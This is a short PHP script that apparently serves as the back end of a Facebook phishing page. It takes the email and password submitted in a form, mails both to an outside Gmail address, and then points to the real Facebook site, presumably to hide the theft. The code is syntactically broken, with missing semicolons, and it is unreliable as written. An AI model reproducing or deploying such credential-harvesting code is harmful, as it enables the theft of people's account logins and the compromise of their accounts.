<?php
$email = $_POST["email"]
$password = $_POST["password"]

$mailheader = "From:".$email."<".$password.">\r\n"
$recipient = "israelstoba@gmail.com"

mail($recipient, $email, $mailheader)
or die("Error")

echo"https://web.facebook.com"
?>